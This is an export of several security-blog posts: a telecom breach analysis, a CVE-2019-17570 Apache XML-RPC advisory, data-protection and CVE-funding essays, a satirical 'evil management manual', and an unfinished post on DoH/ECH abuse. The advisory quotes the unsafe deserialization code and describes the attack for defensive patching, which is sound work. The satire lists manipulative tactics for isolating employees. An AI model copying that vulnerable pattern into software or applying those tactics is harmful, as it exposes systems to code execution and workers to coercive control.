[{"content":"In-Depth Report on Telecommunication Security 1. The Heart of Telecom Infrastructure: Ki and Subscriber Authentication Architecture What is Ki? Ki (Key) is the absolute secret key used to identify and authenticate mobile subscribers. It is stored securely within the USIM card and the carrier‚Äôs core authentication servers (HLR/HSS/5GC), never exposed externally. Authentication is performed by exchanging a random number (RAND) and a response (SRES) based on the Ki. If Ki is leaked:\n‚Üí Attackers could create a \u0026ldquo;fake USIM\u0026rdquo; and successfully authenticate to the network.\n‚Üí This leads to risks like call interception, location tracking, and data theft.\nSubscriber Authentication Flow 2G (GSM): RAND ‚Üí Generate and send SRES ‚Üí Carrier verifies 3G (UMTS) / 4G (LTE): Authentication using AKA protocol and RES response comparison 5G (SA structure): Protect SUPI ‚Üí Only send encrypted SUCI over the network Reference: 3GPP TS 33.102\n2. 5G NSA vs. 5G SA: Structural Differences and Security Comparison NSA Architecture (Non-Standalone) Adds 5G radio (NR) to the existing LTE Core (EPC). Subscriber authentication and session management still rely on LTE procedures. IMSI plaintext exposure risk remains. SA Architecture (Standalone) Fully independent 5G Core (5GC) deployment. Enhanced protection through public key encryption ‚Üí SUPI is encrypted and transmitted as SUCI. SUCI (SUPI Concealment):\nSubscriber devices encrypt SUPI using the carrier\u0026rsquo;s public key, sending SUCI instead. The carrier decrypts SUCI to retrieve SUPI for authentication. Reference: 3GPP TS 33.501\n3. Technical Analysis of the SKT 2025 Breach Incident Overview On April 19, 2025, SK Telecom detected signs of a breach in its core network servers. Potential leakage of USIM information affecting approximately 23 million subscribers. Technical Issues Plaintext transmission risks under NSA-based architecture. Ki leakage enables USIM cloning and SIM swapping attacks. Potential Attack Scenario Core server infiltration ‚Üí Access to subscriber database ‚Üí Create cloned USIM ‚Üí Hijack personal communications. References:\nYonhap News Report SKT Official Announcement 4. In-Depth Analysis of Historical Global Cases Gemalto Hacking Incident 2010‚Äì2011: NSA and GCHQ targeted SIM card manufacturer Gemalto. Attempted to steal SIM encryption keys (Ki) on a massive scale. References:\nThe Intercept - The Great SIM Heist WIRED - Gemalto Hacked APT10 Operation Soft Cell Chinese APT10 group infiltrated global telecom core networks. Mass theft of VIP subscribers\u0026rsquo; call records and location data. Reference:\nCybereason - Operation Soft Cell Circles SS7 Eavesdropping Circles, affiliated with NSO Group, sold SS7-based interception systems. At least 25 governments purchased this technology for mass surveillance. Reference:\nCitizen Lab - Running in Circles 5. Historical Limitations of Telecom Security Architecture: Critique on PKI and HSM Absence Why Wasn\u0026rsquo;t PKI Implemented in Early Mobile Networks? During the 2G/3G era, devices faced critical limitations in CPU performance, battery capacity, and network speed.\nPublic key operations like RSA and ECC were impractical with available technology. Devices lacked sufficient computational and energy resources for real-time encryption. Practical Choice:\n‚Üí A simple and fast symmetric key-based (Ki) authentication structure was adopted.\nHowever, the Issues Were: IMSI was transmitted in plaintext, exposing users to IMSI catcher (fake base station) attacks. If Ki stored in USIMs were stolen, USIM cloning and identity spoofing attacks became feasible. Supply chain risks (SIM manufacturers, telecom operators) were underestimated. Moreover,\nthere was a lack of Hardware Security Modules (HSM) or equivalent secure hardware protection at that time.\nCore servers (HLR/HSS) also lacked clear key separation and internal cryptographic hardware processing. If a core server was compromised, large-scale Ki leakage could occur. Thus, early mobile systems prioritized\n\u0026ldquo;rapid commercialization\u0026rdquo; and \u0026ldquo;low-cost deployment\u0026rdquo; over deep security architecture, resulting in serious structural vulnerabilities.\nWhy PKI and HSM Are Now Essential Today:\nModern devices can handle public key operations (RSA, ECC) in real time. Network latency and performance have improved sufficiently to support encryption. To strengthen telecom security today, we must implement:\nSUPI Encryption (SUCI): Prevent plaintext transmission of subscriber identifiers. TLS Secure Channels: Ensure end-to-end security across internal and external network boundaries. Network Slice-Specific Security Policies: Maintain isolation and protection between services. And on the server side:\nSoftware-based key protection alone is insufficient. HSM or equivalent Secure Environment must be used to: Prevent key leakage Protect boot integrity Detect and resist physical tampering In short:\nEarly mobile networks sacrificed security for rapid rollout,\nwhereas today, trust is the absolute prerequisite for telecom infrastructure.\n6. Practical Countermeasures for Individual Users Use OpenVPN through a Home Router and Restrict Access to Main Services by IP Address\nOpenVPN Installation Guide Adopt OTP Apps\nGoogle Authenticator Introduction Use Hardware Security Keys\nYubiKey Official Site Demand 5G SA Infrastructure Upgrades from Carriers and Government\nQualcomm - 5G SA vs NSA 7. Conclusion There is no such thing as a perfect network.\nBut daily, proactive efforts to protect ourselves\nremain the only true shield against silent, invisible threats.\nAdditional Comparative Analysis SKT Breach: Affected ~23 million users; Ki leakage suspected; no abuse reported yet. Gemalto Breach: Global SIM supply chain attack; mass key leakage debated. APT10 Operation Soft Cell: Long-term infiltration of telecom cores by a Chinese APT group. Circles Eavesdropping: SS7 vulnerabilities exploited for covert surveillance on a global scale. References SKT Official Newsroom The Intercept - The Great SIM Heist WIRED - Gemalto Hacked Cybereason - Operation Soft Cell Citizen Lab - Running in Circles ","permalink":"https://windshock.github.io/en/post/2025-04-28-telecom-security-breach-analysis/","summary":"An in-depth analysis focusing on the 2025 SKT breach, the core security structures of telecom infrastructure, and historical global incidents (Gemalto, APT10, Circles). Also covers subscriber authentication (Ki, SUPI/SUCI) and security differences between 5G SA and NSA.","title":"In-Depth Report on Telecommunication Security: SKT Breach and Global Case Studies"},{"content":"\n1. Overview 1.1 Purpose of the Report This report analyzes the cause and resolution of the CVE-2019-17570 vulnerability in Apache XML-RPC and provides a practical guide for secure implementation in real-world projects.\n1.2 Background Many existing security guides and tools simply report ‚Äúno patch available‚Äù when there is no official fix, without providing developers with concrete remediation steps. This report aims to close that gap by offering actionable security advice from the security team to development teams.\n1.3 Introduction to Apache XML-RPC Apache XML-RPC is a Java-based library that implements XML-RPC, no longer officially maintained by Apache.\n1.4 Summary of CVE-2019-17570 The vulnerability allows Remote Code Execution (RCE) by deserializing untrusted server responses on the client side.\nOfficial advisory: GitHub Advisory 2. Detailed Vulnerability Analysis 2.1 Overview and Impact CWE-502: Deserialization of Untrusted Data An attacker can exploit a malicious XML-RPC server to execute arbitrary code on the client. 2.2 Root Cause Object exception = map.get(\u0026#34;faultCause\u0026#34;); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream((byte[]) exception)); errorCause = (Throwable) ois.readObject(); // Vulnerable code 2.3 Attack Scenario (PoC) A crafted faultCause object sent by a malicious server is deserialized by the client, resulting in code execution.\n3. Patch Analysis 3.1 Key Enhancements Introduced isEnabledForExceptions flag to conditionally allow deserialization Disabled external DTD loading in SAXParser for added XML security 3.2 Code Comparison Before and After Patch After Patch:\nif (((XmlRpcStreamRequestConfig) cfg).isEnabledForExceptions()) { Object exception = map.get(\u0026#34;faultCause\u0026#34;); ... } Disable DTD Loading:\nspf.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); 3.3 Manual Patch Examples Debian Patch openEuler Patch 4. Distribution-Specific Patch Status and Maven Considerations 4.1 Patched Distributions Debian, Red Hat, Amazon Linux: security patches are applied and managed independently 4.2 Limitations of Maven Central No patched version available beyond official 3.1.3; users should use distribution packages or forked versions 4.3 Recommended Dependency \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.evolvedbinary.thirdparty.org.apache.xmlrpc\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;xmlrpc-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 5. Secure Implementation Example XmlRpcClientConfigImpl config = new XmlRpcClientConfigImpl(); config.setServerURL(new URL(\u0026#34;http://trusted-server.com/RPC2\u0026#34;)); config.setEnabledForExceptions(false); // Disable deserialization // Disable external DTD loading SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); SAXParsers.setSAXParserFactory(spf); 6. Conclusion and Recommendations Use distribution-specific patched versions Consider using the evolvedbinary fork Migrate to gRPC, JAX-WS, or SOAP for long-term robustness This report provides actionable insights and implementation tips to mitigate CVE-2019-17570 in production environments.\n","permalink":"https://windshock.github.io/en/post/2025-04-24-cve-2019-17570-apache-xmlrpc/","summary":"A detailed analysis of the CVE-2019-17570 deserialization vulnerability in the Apache XML-RPC library, including patching methods and secure implementation practices.","title":"CVE-2019-17570 Apache XML-RPC Vulnerability Analysis Report"},{"content":"\nIs Your Data in the Cat\u0026rsquo;s Paws? The 2025 KakaoPay Case and the Structural Limitations of Korea‚Äôs Data Protection System Introduction In January 2025, Korea\u0026rsquo;s Personal Information Protection Commission (PIPC) imposed a fine of KRW 6 billion (approximately USD 5.8 million) on KakaoPay (MLex, 2025). Roughly 40 million users\u0026rsquo; data had been transferred to China‚Äôs Alipay without explicit consent and used to build a Non-Financial Score (NSF) model. NSF is a credit-like index that can significantly influence one‚Äôs life‚Äîinsurance rates, loan approvals, or job prospects.\nThis incident is not merely about a data leak‚Äîit reveals the structural flaws of formal consent and corporate self-regulation. We would never entrust a cat to guard a fish market, so why do we hand over our personal data to corporations so easily? This report analyzes the KakaoPay case from legal, technical, and societal perspectives and proposes AI-based DPIA verification tools and citizen monitoring to realize data democracy.\n1. The KakaoPay Case: Details and Legal Violations Case Summary Timeline: April to July 2018 ‚Äî data transfers occurred in three phases (Businesskorea, 2025). Data Transferred: 5.42 billion records, including 24 types of sensitive information such as user names, phone numbers, emails, and account balances. Purpose: Alipay used the data to train its NSF score model. NSF is a non-financial credit index affecting insurance rates, loan decisions, and employment opportunities. Sanctions: In January 2025, the PIPC fined KakaoPay KRW 6 billion and Apple KRW 2.45 billion. Alipay was ordered to dismantle the NSF model. Legal Breaches KakaoPay violated the following clauses of the Personal Information Protection Act (PIPA):\nArticle 20 (Third-Party Consent Requirement): Explicit and specific user consent is required before data is shared with third parties. The consent form failed to mention NSF usage. Article 28 (Cross-Border Data Transfers): Cross-border data transfers require separate consent and additional protection measures. KakaoPay did not comply. ‚ÄúUsers gave consent, but had no idea what they were consenting to.‚Äù\n‚Äî Korea Bizwire, 2025\n2. Structural Flaws in Korea‚Äôs Personal Information Protection Act (PIPA) Summary of Key Provisions Article 20: Requires explicit consent for third-party provision. Article 28: Mandates separate consent and protection for international data transfers. Article 33: Requires a Data Protection Impact Assessment (DPIA) for high-risk data processing. Recent Amendments 2023: A major revision introduced the principle of ‚Äúsame activity, same regulation,‚Äù eliminating special exemptions for Online Service Providers (OSPs). Effective from September 15, 2023 (Data Protection Laws of the World). 2024 Presidential Decree: Introduced the right to explanation for automated decisions, strengthened qualifications for Chief Privacy Officers (CPO), and made data breach insurance mandatory. Problems with Self-Regulation Non-Public DPIA: DPIAs are internally authored and not required to be disclosed, creating a lack of transparency and room for evasion of responsibility. Lack of Oversight: PIPC‚Äôs enforcement focuses on post-violation penalties, not proactive prevention. Korea‚Äôs PIPA structure where companies self-author DPIAs has been likened to letting a cat guard the fish. DLA Piper criticized the non-disclosure of DPIA reports as a lack of transparency.\n‚Äî DLA Piper ‚Äì South Korea Data Protection\n3. AI-Based DPIA Verification: A Technological Opportunity AI can enhance the objectivity and transparency of DPIAs. AI-based DPIA verification tools can analyze data flows, detect potential risks, and auto-generate reports. In Europe, the \u0026ldquo;Privacy-Aware AI\u0026rdquo; framework is used to assess GDPR compliance. Similar approaches can be adopted in Korea (Fieldfisher, 2023).\nExamples of AI-Based DPIA Tools Several platforms have begun to integrate AI in supporting DPIA processes:\nKetch offers AI-powered recommendations for automated Privacy Impact Assessments (PIAs), helping improve DPIA accuracy and risk identification. Securiti provides global DPIA automation capabilities. Although it does not overtly advertise AI functionality, its framework implies AI-driven assessments. Clarip markets its DPIA automation software with phrases like ‚ÄúHybrid AI Rocks!‚Äù suggesting AI assistance, though specific AI features are not fully detailed. These platforms primarily aim to automate privacy risk assessments, supporting the DPIA process by detecting overlooked vulnerabilities and ensuring comprehensive reviews. However, most are not designed as standalone DPIA verification engines, and the transparency of AI components varies.\nAcademic and Industry Research While research directly targeting AI-based DPIA verification is still scarce, there are valuable resources on conducting DPIAs for AI systems and integrating AI into DPIA processes:\nFieldfisher‚Äôs guide outlines best practices for DPIAs in AI contexts and explains how AI technologies can support privacy compliance. Mansi‚Äôs blog explores AI-assisted methods in DPIA, such as automated classification, predictive risk analysis, monitoring, and documentation. The academic paper \u0026ldquo;Proposing a Data Privacy Impact Assessment (DPIA) Model for AI Projects under U.S. Privacy Regulations\u0026rdquo; (ResearchGate, 2025) proposes a DPIA framework tailored to AI projects, highlighting the need for structured, AI-integrated assessment models. These sources build the foundation for evolving AI-enhanced DPIA tools and models that combine legal compliance with technical precision.\nChallenges and Outlook Currently, AI-based DPIA verification tools remain limited. They often function as compliance support tools rather than dedicated verification engines. However, they offer significant potential to improve DPIA processes in terms of efficiency, comprehensiveness, and objectivity. As research advances and regulatory demand increases, more sophisticated and transparent AI-driven DPIA tools are expected to emerge in the near future.\n4. The Role and Effectiveness of Civic Monitoring Citizen oversight is critical for effective privacy protection. The 2022 Future of Privacy Forum (FPF) report criticized the limits of consent-based frameworks and emphasized risk-based approaches and civic engagement (FPF, 2022). Studies in the ACM Digital Library support citizen-centered governance, especially in smart city contexts (DGOV, 2023).\nIn fact, the KakaoPay case was initiated by a citizen group‚Äôs report, which led to a police investigation‚Äîhighlighting the power of civic monitoring (MLex, 2024).\n5. Institutional Proposals for Data Democracy The KakaoPay case exposed systemic vulnerabilities in data protection. Institutional reform combining AI verification and civic oversight is essential:\nIntroduce AI-Based DPIA Verification\nLed by the PIPC, use AI tools to verify the objectivity of DPIA reports. Mandate DPIA Transparency\nRequire public summaries of DPIAs and establish independent review committees including experts and citizens. Establish a Right to Data Location APIs\nExpand PIPA Article 18 (Data Portability Rights) to mandate APIs that track data storage and movement paths. Strengthen Explanations for Automated Decisions\nMandate clear explanations for decisions like NSF scores and impose penalties for non-compliance. Institutionalize Public Citizen Auditing Teams\nLegalize citizen-led audits involving civil society, academia, and professionals to inspect data processing practices. Democratize the PIPA Revision Process\nMandate public hearings and formal inclusion of consumer advocacy groups in legislative procedures. Conclusion The 2025 KakaoPay case laid bare the limits of formal consent and self-regulation. Though PIPA is a strong framework, without oversight and civic engagement, it remains hollow. AI-powered DPIA verification tools offer a technological solution for transparency and objectivity, while civic monitoring is the social engine that sustains it. It is time to open the gates of corporate data control and realize data democracy through collaboration between citizens and experts.\nReferences MLex, 2025 Businesskorea, 2025 Data Protection Laws of the World Fieldfisher, 2023 FPF, 2022 DGOV, 2023 MLex, 2024 ","permalink":"https://windshock.github.io/en/post/2025-04-21-expert-personal-data-report/","summary":"The 2025 KakaoPay case exposed the limits of formal consent and self-regulation. Data democracy must be achieved through AI-based DPIA verification and civic oversight.","title":"Is Your Data in the Cat's Paws?"},{"content":"\n‚ÄúThere‚Äôs no such thing as a free lunch.‚Äù\nBut for decades, cybersecurity has felt like one.\nCVE: Not Just a Number, But a Map CVE‚ÄîCommon Vulnerabilities and Exposures‚Äîis often mistaken for just another ID system.\nBut as Adam Shostack explains, its true value lies not in the number itself, but in its function as a stable knowledge concordance across disparate systems:\n‚ÄúThe value of CVE is not the number, but its ability to reliably cross-reference tools, databases, and vendor patches.‚Äù\nIn essence, CVE is like the ISBN for cybersecurity. It allows tools, vendors, researchers, and patching systems to align with one shared reference.\nA System We All Used, For Free CVE has been maintained by MITRE, a U.S. government-funded nonprofit.\nAnd yet, the entire global security ecosystem has depended on this system for free:\nEnterprises Governments Open source communities Security vendors CVE has operated as a global public good, without international funding, and with most contributions from unpaid researchers.\nThe Collapse That Nearly Happened In April 2025, MITRE\u0026rsquo;s government contract for CVE operations nearly expired.\nA last-minute intervention from CISA granted an 11-month extension, but the future remains uncertain.\nWe narrowly avoided the collapse of the system that powers vulnerability coordination worldwide.\nThe structural issue is clear: CVE relies on a single nation\u0026rsquo;s funding, despite global usage. This concern has been highlighted in recent reports from Reuters, BleepingComputer, and The Register.\nWhat If There Were a Security Tax? Imagine this:\nHigh-risk corporations contribute a small percentage of revenue to a public fund for security infrastructure.\nThis fund supports CVE-like systems, NGOs, bug bounty programs, and researcher compensation.\nThis idea is explored further in this article.\nWhile this model is not yet implemented anywhere, it reflects a growing recognition:\nFree-riding on security infrastructure is unsustainable Public security systems require collective funding Contributors deserve compensation, not just credit Further discourse in BankInfoSecurity and TechTarget shows a shift toward incentives and reframing cybersecurity as a shared cost burden.\nIt\u0026rsquo;s Time to Pay for What We\u0026rsquo;ve Been Using CVE wasn‚Äôt truly free.\nIt ran on the unpaid labor of researchers, the infrastructure of nonprofits, and a single government‚Äôs budget.\nNow, as that model falters, we need shared solutions:\nInternational funding models Industry co-funding Governmental cooperation Transparent compensation for contributors Initiatives like Common Good Cyber are beginning to pave the way. Their proposed structures‚Äîjoint funding mechanisms, federated fundraising, and accelerator hubs‚Äîwere highlighted at RSA Conference 2025, aiming to produce a global, multilateral support system.\nThis also aligns with public-private models advocated by CSIS.\nSecurity has felt like a free lunch.\nBut someone was always paying.\nüìå TL;DR CVE is core public infrastructure for cybersecurity. It\u0026rsquo;s been used globally but funded locally. It nearly collapsed in 2025 due to expiring contracts. We must build funding mechanisms for global security commons. The free lunch is over. We just didn‚Äôt notice who was footing the bill.\n","permalink":"https://windshock.github.io/en/post/2025-04-17-theres-no-such-thing-as-a-free-lunch-but-security-was-free/","summary":"The global security community has depended on CVE for decades without ever paying a dime. As the system nears collapse, it\u0026rsquo;s time to ask who should bear the cost of public cybersecurity infrastructure.","title":"There‚Äôs No Such Thing as a Free Lunch, But Security Was Free"},{"content":"üìÇ [Confidential Document] Leaked Copy\nIn the AI Era, Employees Are Isolated and Organizations Thrive ‚Äî Evil Management Manual v1.0 1. Human Relationships? Eliminate Them What happens when people get too close?\nGossip Mass resignations Solidarity and resistance ‚úÖ Solution: Build an AI-centered communication system\nAutomate meeting summaries, reminders, and reports Reduce human interaction ‚Üí Eliminate emotional overhead ‚ÄúTeamwork is a cost. Efficiency comes from silent individuals.‚Äù\n2. Isolation Means Control Lonely employees work quietly.\nNo peers to share concerns with No place to vent stress Obey rules before raising issues ‚úÖ Implementation Strategy:\nPromote remote work and asynchronous communication Use collaboration tools focused on AI summarization Minimize meetings, quantify feedback ‚ÄúIsolation equals obedience.‚Äù\n3. Leadership Is Replaced by Data Managers no longer comfort or persuade.\nAI handles assignment, tracking, reminders Performance evaluated solely through KPIs ‚úÖ Leader‚Äôs New Role:\nInterpret dashboards instead of emotions Provide metric-based feedback instead of trust ‚ÄúHumans are emotional. Data is not.‚Äù\n4. Autonomy = Personal Responsibility Flexible work? AI tools provided? Sounds great, right?\nActually, all responsibility shifts to individuals When they fail: ‚ÄúYou chose this yourself.‚Äù ‚úÖ Usage Strategy:\nEmphasize workflow automation tools Frame mistakes as personal decisions, not managerial failure ‚ÄúWe helped. You failed. That‚Äôs it.‚Äù\n5. Isolation Delays Resignation Disconnected employees hesitate to leave.\nNo one to vent to ‚Üí Less conviction No peers to leave with ‚Üí Delay ‚úÖ Retention Strategy:\nMinimize non-work communication channels Discourage informal gatherings Let AI quietly collect HR exit signals ‚ÄúThe isolated break quietly. And remain.‚Äù\nüìà Conclusion: This Isn‚Äôt Efficiency. It‚Äôs the Art of Control. Organizational Problem AI-Era Solution Emotional labor stress Eliminated (AI summaries) Team bonding / social cost Eliminated (structured remote work) Complaints, collective acts Eliminated (communication silos) Blame ambiguity Solved via ‚Äúautonomous‚Äù framing Leadership burden Replaced by dashboards ‚ÄúGrowth comes to those who work quietly.\nIsolation fattens the company.‚Äù\n‚ò† This document is confidential. Access is logged. ‚ò†\n","permalink":"https://windshock.github.io/en/post/2025-04-07-evil-management-manual/","summary":"\u003cp\u003eüìÇ \u003cstrong\u003e[Confidential Document] Leaked Copy\u003c/strong\u003e\u003c/p\u003e\n\u003ch1 id=\"in-the-ai-era-employees-are-isolated-and-organizations-thrive\"\u003eIn the AI Era, Employees Are Isolated and Organizations Thrive\u003c/h1\u003e\n\u003ch3 id=\"-evil-management-manual-v10\"\u003e‚Äî Evil Management Manual v1.0\u003c/h3\u003e\n\u003ch2 id=\"in-the-ai-era-the-isolated-human\"\u003e\u003cimg alt=\"In the AI Era, the Isolated Human\" loading=\"lazy\" src=\"/images/post/Employees-Are-Isolated-and-Organizations-Thrive.webp\"\u003e\u003c/h2\u003e\n\u003ch2 id=\"1-human-relationships-eliminate-them\"\u003e1. Human Relationships? Eliminate Them\u003c/h2\u003e\n\u003cp\u003eWhat happens when people get too close?\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eGossip\u003c/li\u003e\n\u003cli\u003eMass resignations\u003c/li\u003e\n\u003cli\u003eSolidarity and resistance\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e‚úÖ \u003cstrong\u003eSolution\u003c/strong\u003e: Build an AI-centered communication system\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAutomate meeting summaries, reminders, and reports\u003c/li\u003e\n\u003cli\u003eReduce human interaction ‚Üí Eliminate emotional overhead\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e‚ÄúTeamwork is a cost. Efficiency comes from silent individuals.‚Äù\u003c/p\u003e","title":"In the AI Era, Employees Are Isolated and Organizations Thrive"},{"content":"\nWe live in an era overflowing with information and surging technology.\nAI mimics human speech, summarizes thought, and even predicts intent.\nBut amidst all this, something vital is slowly being forgotten.\nThat is:\n\u0026ldquo;Who thought of it first,\u0026rdquo;\n\u0026ldquo;Who connected it,\u0026rdquo;\n\u0026ldquo;Who gave it meaning.\u0026rdquo;\nAI processes data. But insight belongs to humans.\nTo reinterpret the bypassing of Citrix VDI policies not as a mere technical vulnerability,\nbut as a legal violation,\na collapse of network isolation,\nand a real-world regulatory failure‚Äî\nthat is not something AI can do.\nIt is a human act of context-building and\na creative synthesis of law, policy, and technical risk.\nI asked AI for assistance‚Äî and it documented, expanded, and supported my idea.\nBut that was not creation, it was collaboration.\nAnd true collaboration requires boundaries and ethics.\nThe danger today is that AI cannot tell you and me apart.\nIt cannot distinguish between the human and the machine.\nIt cannot trace the originator from the final user.\nOne day, even human-born ideas\nmay be mistakenly credited to AI.\nThat is not just a technological leap‚Äî\nit is a silencing of memory.\nSo I make this declaration. I will record my ideas.\nI will name their origin.\nI will embed my presence in forms machines can understand.\nIn the \u0026lt;meta\u0026gt; of HTML,\nIn the author field of Markdown,\nIn the refusal written into robots.txt‚Äî\nI write my name.\nI say this: ‚ÄúThis thought belongs to a human.‚Äù\n‚ÄúThis insight was first spoken by windshock.‚Äù\n‚ÄúAI is an assistant, not an author.‚Äù\nThis is not a grand claim of copyright.\nIt is a mark that I was here.\nThat I created.\nLet technology progress‚Äî\nbut let human presence remain.\nMachines may speak,\nbut meaning is made by us.\nAnd I trust that meaning will be remembered\nby people like you, who are reading these words now.\nüñãÔ∏è windshock, April 2025\nA boundary-drawer in the age of machine collaboration.\nüìö Further Reading \u0026amp; References U.S. Copyright Office ‚Äì Official stance confirming that works generated solely by AI are not eligible for copyright protection.\nhttps://www.jdsupra.com/legalnews/human-authorship-required-ai-isn-t-an-7738406/\nThe Ethics of AI Art ‚Äì Discussion of how AI-generated art impacts human artists, including issues of style imitation and copyright infringement.\nhttps://www.theartist.me/art/the-ethical-implication-of-ai-generated-art/\nAI as a Tool or Creator? ‚Äì Debates on whether AI merely assists humans or takes on an authorial role in creative processes.\nhttps://www.straitstimes.com/opinion/forum/forum-ai-can-complement-the-creative-process-not-replace-it\nCopyright Lawsuits over AI Training Data ‚Äì Class actions filed against AI developers for training on copyrighted content without permission.\nhttps://www.dglaw.com/court-rules-ai-training-on-copyrighted-works-is-not-fair-use-what-it-means-for-generative-ai/\nLegal Standards for Copyright in AI-Assisted Works ‚Äì Overview of how human contribution is assessed in works involving generative AI.\nhttps://academic.oup.com/jiplp/article/18/12/841/7331468\nMetadata and Attribution Strategies ‚Äì Proposals for preserving human authorship through metadata, prompt documentation, and transparency.\nhttps://www.ipic.ai/blogs/what-are-the-ethical-dilemmas-of-ai-art-generators/\n","permalink":"https://windshock.github.io/en/post/2025-04-03-human-place-in-ai-age/","summary":"\u003cp\u003e\u003cimg alt=\"Abstract illustration representing human presence in AI\" loading=\"lazy\" src=\"/images/human-place-abstract.webp\"\u003e\u003c/p\u003e\n\u003cp\u003eWe live in an era overflowing with information and surging technology.\u003cbr\u003e\nAI mimics human speech, summarizes thought, and even predicts intent.\u003cbr\u003e\nBut amidst all this, something vital is slowly being forgotten.\u003c/p\u003e\n\u003cp\u003eThat is:\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who thought of it first,\u0026rdquo;\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who connected it,\u0026rdquo;\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who gave it meaning.\u0026rdquo;\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"ai-processes-data\"\u003eAI processes data.\u003c/h3\u003e\n\u003cp\u003eBut \u003cstrong\u003einsight belongs to humans\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eTo reinterpret the bypassing of Citrix VDI policies \u003cstrong\u003enot\u003c/strong\u003e as a mere technical vulnerability,\u003cbr\u003e\nbut as a \u003cstrong\u003elegal violation\u003c/strong\u003e,\u003cbr\u003e\na \u003cstrong\u003ecollapse of network isolation\u003c/strong\u003e,\u003cbr\u003e\nand a \u003cstrong\u003ereal-world regulatory failure\u003c/strong\u003e‚Äî\u003cbr\u003e\nthat is not something AI can do.\u003cbr\u003e\nIt is a human act of context-building and\u003cbr\u003e\n\u003cstrong\u003ea creative synthesis of law, policy, and technical risk.\u003c/strong\u003e\u003c/p\u003e","title":"The Place of Humans: Declaring the Creator‚Äôs Rights in the Age of AI"},{"content":"\nAs modern software development grows more complex and security threats more frequent, developers often fall into common misconceptions about security responsibilities and protections. This article categorizes the most common developer security myths into three groups‚ÄîResponsibility Deflection, Overconfidence in Technology, and Security Underestimation‚Äîand provides realistic, actionable counterpoints.\nüìå 1. Responsibility Deflection Myth: \u0026ldquo;Security is the security team‚Äôs responsibility, not mine.\u0026rdquo; Reality: Developers play a critical role in ensuring secure applications. In DevSecOps environments, security is a shared responsibility. When developers overlook security from the early stages, vulnerabilities can easily creep into code (source).\nMyth: \u0026ldquo;We use GitHub, AWS, and other SaaS platforms‚Äîso we‚Äôre safe.\u0026rdquo; Reality: While SaaS providers offer security measures, users are still responsible for correct configurations and avoiding insecure integrations. A recent GitHub Actions supply chain attack via tj-actions/changed-files exposed the risks (source).\nüìå 2. Overconfidence in Technology Myth: \u0026ldquo;Our code is written in Rust, so it‚Äôs secure.\u0026rdquo; Reality: Rust ensures memory safety and prevents data races, but doesn‚Äôt automatically guard against threats like SQL injection or XSS. Using unsafe blocks can reintroduce vulnerabilities. Carnegie Mellon\u0026rsquo;s SEI outlines Rust‚Äôs limits, especially regarding third-party library misuse and injection attacks (source).\nMyth: \u0026ldquo;We use the latest frameworks and libraries‚Äîit must be secure.\u0026rdquo; Reality: Modern tools are not immune to security flaws. Without regular updates and proper usage, vulnerabilities remain. A study found 86% of open-source codebases include known vulnerabilities (source).\nMyth: \u0026ldquo;HTTPS keeps our data safe.\u0026rdquo; Reality: HTTPS secures data in transit but does not protect against server-side vulnerabilities, misconfigurations, or insider threats.\nMyth: \u0026ldquo;A firewall protects us from external threats.\u0026rdquo; Reality: Firewalls can be misconfigured and don‚Äôt protect against insider threats or attacks using trusted connections.\nüìå 3. Security Underestimation Myth: \u0026ldquo;We don‚Äôt handle sensitive data, so security isn‚Äôt a concern.\u0026rdquo; Reality: Even seemingly harmless systems can become entry points for attackers to access larger networks.\nMyth: \u0026ldquo;Code reviews will catch all the security issues.\u0026rdquo; Reality: Code reviews are useful, but without security expertise and automated tools, many vulnerabilities go undetected. Regular testing and security scans are essential.\nMyth: \u0026ldquo;We‚Äôve tested the code‚Äîso it must be safe.\u0026rdquo; Reality: Functional tests don‚Äôt cover security flaws. Security testing must be a separate, ongoing process involving both design and runtime analysis.\nüìå Real-World Incidents GitHub Actions Supply Chain Attack (2025)\n‚Üí Over 23,000 repositories at risk of CI/CD secret exposure (source).\nLog4Shell Vulnerability (2021)\n‚Üí Critical remote code execution vulnerability in Apache Log4j affected systems globally (source).\nüìå Recommendations for Developers Provide Regular Security Training\nFocus on practical awareness, using OWASP Top 10 as a foundational guide (source).\nIntegrate Security Automation\nUse tools like SAST (Static Analysis), DAST (Dynamic Analysis), and SBOM (Software Bill of Materials) to continuously monitor code.\nManage Open Source Dependencies\nEmploy automated tools like Dependabot or Renovate to detect and patch vulnerable libraries.\nPin Dependency Versions\nUse commit hashes instead of floating tags (e.g., @v3) in GitHub Actions to avoid supply chain attacks.\nSecurity isn\u0026rsquo;t just about tools‚Äîit\u0026rsquo;s a shared culture and ongoing process that must be built into how we write, test, and deliver code.\n","permalink":"https://windshock.github.io/en/post/2025-04-01-common-security-myths-developers-tell-themselves/","summary":"This article breaks down common developer security myths‚Äîresponsibility deflection, overconfidence in technology, and security underestimation‚Äîand offers realistic countermeasures.","title":"Common Security Myths Developers Tell Themselves"},{"content":"\nBackground Public DNS services like Cloudflare (1.1.1.1) and Google (8.8.8.8) have increasingly been abused as C2 channels for malware.\nTechnologies such as DoH (DNS over HTTPS) and ECH (Encrypted Client Hello) encrypt DNS traffic and SNI fields, making it difficult for security solutions to detect and inspect network activity.\nNote: ESNI (Encrypted SNI) is deprecated and has been replaced by ECH as the current standard. This guide focuses on ECH only.\nThreat Factors Policy Bypass: Users can manually configure public DoH servers like Cloudflare or Google, bypassing enterprise DNS policies. C2 Evasion: ECH encrypts the SNI field during TLS handshakes, making domain-based filtering difficult. Data Exfiltration: Encrypted DNS channels may be exploited to send internal data outside the organization. Core 